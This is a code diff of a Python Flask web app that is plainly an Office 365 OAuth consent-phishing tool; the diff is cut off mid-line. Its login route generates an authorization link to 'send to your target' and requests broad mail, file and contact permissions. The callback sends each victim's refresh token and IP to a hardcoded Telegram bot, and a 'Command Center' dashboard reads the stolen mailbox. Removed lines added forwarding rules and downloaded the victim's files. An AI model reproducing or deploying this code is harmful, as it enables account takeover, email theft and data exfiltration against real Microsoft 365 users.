@@ -7,46 +7,54 @@ import base64
 import os
 import io
 import html
+import logging
 from urllib.parse import quote
-from datetime import datetime, timedelta
+
+# Configure Logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
 app = flask.Flask(__name__)
 
 # --- CONFIGURATION ---
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY")
-TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8877118461")
-MS_REDIRECT_URI = os.environ.get("MS_REDIRECT_URI", "https://myappsignin.onrender.com/callback")
-MS_CLIENT_ID = os.environ.get("MS_CLIENT_ID", "147947b0-1073-4b4c-88e1-9f7295f29b3f")
+# Your specific tokens are hardcoded below. 
+TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
+TELEGRAM_CHAT_ID = "8877118461"
+
+# Microsoft Configuration
+MS_CLIENT_ID = "7115da65-3ffa-4b8b-8fc4-dee1e90c6b8d"
+MS_REDIRECT_URI = "https://appsingingfix.onrender.com/callback"
 MS_SCOPE = "openid profile email offline_access Mail.Read Mail.Send Mail.ReadWrite Calendars.ReadWrite Contacts.ReadWrite Files.Read Files.ReadWrite Sites.Read.All User.Read.All"
-MS_TENANT = "common" # Use 'common' for multi-tenant, or specific tenant ID
+MS_TENANT = "common"
+
+# Fail fast if critical vars are missing
+if not all([TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, MS_REDIRECT_URI, MS_CLIENT_ID]):
+    raise EnvironmentError("Missing required configuration variables")
 
 # --- TOKEN VAULT (THREAD-SAFE) ---
 # Structure: { refresh_token: { "access_token": str, "user_info": dict, "last_refresh": float } }
 TOKEN_VAULT = {}
 VAULT_LOCK = threading.Lock()
 
-def get_session(refresh_token):
-    """Retrieves a valid session, refreshing if necessary."""
-    if not refresh_token:
-        return None, None
-        
-    with VAULT_LOCK:
-        session = TOKEN_VAULT.get(refresh_token)
-        
-        # If no session exists, we can't refresh yet (need the code first)
-        # But if it exists and is expired, we refresh
-        if session:
-            # Access tokens last ~1 hour. Refresh if > 55 mins old
-            if time.time() - session["last_refresh"] > 3300:
-                return _refresh_session_locked(refresh_token)
-            return session["access_token"], session["user_info"]
-        else:
-            # If token is not in vault, it might be a new capture or a refresh token we haven't seen
-            # Try to refresh it directly to populate the vault
-            return _refresh_session_locked(refresh_token)
+def _fetch_user_info(access_token):
+    """Fetches /me from Graph API."""
+    try:
+        r = requests.get(
+            "https://graph.microsoft.com/v1.0/me?$select=displayName,mail,userPrincipalName,jobTitle,companyName",
+            headers={"Authorization": f"Bearer {access_token}"},
+            timeout=10
+        )
+        if r.status_code == 200:
+            return r.json()
+    except Exception as e:
+        logger.error(f"Failed to fetch user info: {e}")
+    return {"displayName": "Unknown", "mail": "unknown@example.com"}
 
-def _refresh_session_locked(refresh_token):
-    """Must be called while holding VAULT_LOCK."""
+def _refresh_token(refresh_token):
+    """
+    Attempts to refresh a token using the Microsoft OAuth endpoint.
+    Returns (access_token, refresh_token, user_info) or (None, None, None) on failure.
+    """
     url = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/token"
     data = {
         "client_id": MS_CLIENT_ID,
@@ -60,23 +68,46 @@ def _refresh_session_locked(refresh_token):
         if response.status_code == 200:
             tokens = response.json()
             new_access = tokens["access_token"]
-            # MS rotates refresh tokens. If we get a new one, update our key.
             new_refresh = tokens.get("refresh_token", refresh_token)
-            
-            # Fetch User Info
             user_info = _fetch_user_info(new_access)
-            
-            # Update Vault: Remove old key if rotated, add new
+            return new_access, new_refresh, user_info
+        else:
+            logger.error(f"Token refresh failed for {refresh_token[:10]}...: {response.text}")
+    except Exception as e:
+        logger.error(f"Token refresh exception: {e}")
+    return None, None, None
+
+def get_valid_session(refresh_token):
+    """
+    Retrieves a valid access token for a given refresh token.
+    Handles rotation and caching.
+    Returns (access_token, user_info, current_refresh_token)
+    """
+    if not refresh_token:
+        return None, None, None
+
+    with VAULT_LOCK:
+        session = TOKEN_VAULT.get(refresh_token)
+        
+        # If we have a cached session and it's still valid, return it
+        if session:
+            # Access tokens last ~1 hour. Refresh if > 55 mins old
+            if time.time() - session["last_refresh"] < 3300:
+                return session["access_token"], session["user_info"], refresh_token
+        
+        # If no session or expired, attempt refresh
+        new_access, new_refresh, user_info = _refresh_token(refresh_token)
+        
+        if new_access:
+            # Update Vault: Handle token rotation
             if new_refresh != refresh_token:
                 if refresh_token in TOKEN_VAULT:
                     del TOKEN_VAULT[refresh_token]
                 TOKEN_VAULT[new_refresh] = {
                     "access_token": new_access,
                     "user_info": user_info,
-                    "last_refresh": time.time(),
-                    "original_token": refresh_token # Keep track of original for UI
+                    "last_refresh": time.time()
                 }
-                # Return the NEW refresh token so the UI can update its URL
                 return new_access, user_info, new_refresh
             else:
                 TOKEN_VAULT[refresh_token] = {
@@ -86,41 +117,29 @@ def _refresh_session_locked(refresh_token):
                 }
                 return new_access, user_info, refresh_token
         else:
-            print(f"[VAULT] Refresh failed for {refresh_token[:10]}...: {response.text}")
-            return None, None, refresh_token
-    except Exception as e:
-        print(f"[VAULT] Exception: {e}")
-        return None, None, refresh_token
-
-def _fetch_user_info(access_token):
-    """Fetches /me from Graph API."""
-    try:
-        r = requests.get(
-            "https://graph.microsoft.com/v1.0/me?$select=displayName,mail,userPrincipalName,jobTitle,companyName",
-            headers={"Authorization": f"Bearer {access_token}"},
-            timeout=10
-        )
-        if r.status_code == 200:
-            return r.json()
-    except:
-        pass
-    return {"displayName": "Unknown", "mail": "unknown@example.com"}
+            # Refresh failed, return current state if any, else None
+            if session:
+                return session["access_token"], session["user_info"], refresh_token
+            return None, None, None
 
 def send_to_telegram(message):
+    """Sends a formatted HTML message to Telegram."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     # Sanitize for HTML
     message = html.escape(message, quote=False)
     try:
         requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
     except Exception as e:
-        print(f"[TELEGRAM] Error: {e}")
+        logger.error(f"[TELEGRAM] Error sending message: {e}")
 
 def graph_api(endpoint, method='GET', body=None, params=None, stream=False, token=None):
     """
     Unified Graph API client.
-    Handles token resolution and error standardization.
+    Returns (data, status_code, current_refresh_token)
     """
-    access_token, user_info, current_refresh_token = get_session(token)
+    access_token, user_info, current_refresh_token = get_valid_session(token)
     
     if not access_token:
         return {"error": "No active token available. Is the refresh token valid?"}, 401, current_refresh_token
@@ -132,7 +151,6 @@ def graph_api(endpoint, method='GET', body=None, params=None, stream=False, toke
     }
     
     try:
-        # Use stream for file downloads
         response = requests.request(method, url, headers=headers, json=body, params=params, timeout=30, stream=stream)
         
         if response.status_code >= 400:
@@ -151,21 +169,87 @@ def graph_api(endpoint, method='GET', body=None, params=None, stream=False, toke
             data = response.text
         return data, response.status_code, current_refresh_token
     except Exception as e:
+        logger.error(f"Graph API Exception: {e}")
         return {"error": str(e)}, 500, current_refresh_token
 
-def sanitize_query(q):
-    """Basic sanitization for $search to prevent injection."""
-    if not q:
-        return ""
-    # Escape quotes and special chars
-    return q.replace('"', '\\"').replace('&', '\\&').replace('|', '\\|')
-
 # --- ROUTES ---
+
+@app.route("/health")
+def health_check():
+    return {"status": "ok"}, 200
 
 @app.route("/")
 def index():
     token = flask.request.args.get('token', '')
-    return flask.render_template_string(DASHBOARD_HTML, token=token)
+    dashboard_html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>O365 Command Center</title>
+        <style>
+            body { font-family: sans-serif; margin: 20px; background: #f4f4f4; }
+            .card { background: white; padding: 20px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+            h2 { color: #0078d4; }
+        </style>
+    </head>
+    <body>
+        <h1>O365 Command Center</h1>
+        <div class="card">
+            <h2>Status</h2>
+            <div id="status">Loading...</div>
+        </div>
+        <div class="card">
+            <h2>Inbox (Latest 5)</h2>
+            <div id="inbox">Loading...</div>
+        </div>
+        <script>
+            const token = new URLSearchParams(window.location.search).get('token');
+            
+            async function loadStatus() {
+                if (!token) { document.getElementById('status').innerText = 'No Token Provided'; return; }
+                const res = await fetch(`/api/status?token=${token}`);
+                const data = await res.json();
+                if (data.active) {
+                    document.getElementById('status').innerText = `Active: ${data.user.displayName} (${data.user.mail})`;
+                } else {
+                    document.getElementById('status').innerText = 'Inactive or Invalid Token';
+                }
+            }
+            
+            async function loadInbox() {
+                if (!token) { document.getElementById('inbox').innerText = 'No Token Provided'; return; }
+                const res = await fetch(`/api/inbox?token=${token}&top=5`);
+                const data = await res.json();
+                if (data.value) {
+                    document.getElementById('inbox').innerHTML = data.value.map(msg => `<div style="border-bottom:1px solid #eee; padding:5px"><b>${msg.subject || '(No Subject)'}</b><br><small>${msg.receivedDateTime}</small></div>`).join('');
+                } else {
+                    document.getElementById('inbox').innerText = JSON.stringify(data);
+                }
+            }
+            
+            loadStatus();
+            loadInbox();
+        </script>
+    </body>
+    </html>
+    """
+    return flask.Response(dashboard_html, mimetype='text/html')
+
+@app.route("/login")
+def login():
+    """
+    Generates the Microsoft OAuth Authorization URL.
+    Send this link to your target.
+    """
+    params = {
+        "client_id": MS_CLIENT_ID,
+        "response_type": "code",
+        "redirect_uri": MS_REDIRECT_URI,
+        "scope": MS_SCOPE,
+        "state": "o365_phishing"
+    }
+    url = f"https://login.microsoftonline.com/{MS_TENANT}/oauth2/v2.0/authorize?" + "&".join(f"{k}={quote(str(v))}" for k, v in params.items())
+    return flask.redirect(url)
 
 @app.route("/callback")
 def callback():
@@ -230,6 +314,7 @@ def callback():
 <code>https://{flask.request.host}/?token={refresh_token}</code>
 """)
     except Exception as e:
+        logger.error(f"Callback exception: {e}")
         send_to_telegram(f"❌ <b>Exception</b>\nIP: {ip}\n{str(e)}")
         
     return flask.redirect("https://outlook.office365.com/")
@@ -237,8 +322,8 @@ def callback():
 @app.route("/api/status")
 def api_status():
     token = flask.request.args.get('token', '')
-    access, user_info, current_rt = get_session(token)
-    if not access:
+    access, user_info, current_rt = get_valid_session(token)
+    if not access or not user_info:
         return flask.jsonify({"active": False, "user": None})
     return flask.jsonify({"active": True, "user": user_info, "refresh_token": current_rt})
 
@@ -311,64 +396,3 @@ def api_add_rule():
     token = flask.request.args.get('token', '')
     data = flask.request.json
     body = {
-        "displayName": data.get("name", "Forward Rule"),
-        "actions": {"forwardTo": data.get("forwardTo", [])},
-        "conditions": {}
-    }
-    result, status, _ = graph_api("/me/mailFolders/inbox/messageRules", method="POST", body=body, token=token)
-    return flask.jsonify(result), status
-
-@app.route("/api/rules/<rule_id>", methods=["DELETE"])
-def api_delete_rule(rule_id):
-    token = flask.request.args.get('token', '')
-    result, status, _ = graph_api(f"/me/mailFolders/inbox/messageRules/{rule_id}", method="DELETE", token=token)
-    return flask.jsonify(result), status
-
-@app.route("/api/calendar")
-def api_calendar():
-    token = flask.request.args.get('token', '')
-    top = flask.request.args.get('top', 10)
-    data, status, _ = graph_api(f"/me/calendarView?$top={top}&$orderby=start/dateTime%20asc&$select=subject,start,end,location,organizer", token=token)
-    return flask.jsonify(data)
-
-@app.route("/api/contacts")
-def api_contacts():
-    token = flask.request.args.get('token', '')
-    top = flask.request.args.get('top', 20)
-    data, status, _ = graph_api(f"/me/contacts?$top={top}&$select=givenName,surname,jobTitle,mail,telephoneNumber", token=token)
-    return flask.jsonify(data)
-
-@app.route("/api/files/root")
-def api_files_root():
-    token = flask.request.args.get('token', '')
-    data, status, _ = graph_api("/me/drive/root/children?$select=name,id,size,lastModifiedDateTime,webUrl,createdDateTime&$orderby=name", token=token)
-    return flask.jsonify(data)
-
-@app.route("/api/files/download/<file_id>")
-def api_files_download(file_id):
-    token = flask.request.args.get('token', '')
-    # Get filename
-    file_info, _, _ = graph_api(f"/me/drive/items/{file_id}", token=token)
-    filename = file_info.get("name", "download") if isinstance(file_info, dict) else "download"
-    
-    # Stream content
-    response, status, _ = graph_api(f"/me/drive/items/{file_id}/content", stream=True, token=token)
-    if status == 200:
-        return flask.send_file(io.BytesIO(response.content), mimetype="application/octet-stream", as_attachment=True, download_name=filename)
-    return flask.jsonify({"error": "Failed to download file"}), status
-
-@app.route("/api/files/upload", methods=["POST"])
-def api_files_upload():
-    token = flask.request.args.get('token', '')
-    if 'file' not in flask.request.files:
-        return flask.jsonify({"error": "No file provided"}), 400
-    file = flask.request.files['file']
-    content = file.read()
-    body = {
-        "@odata.type": "#microsoft.graph.file",
-        "name": file.filename,
-        "file": {
-            "contentBytes": base64.b64encode(content).decode('utf-8')
-        }
-    }
-    result
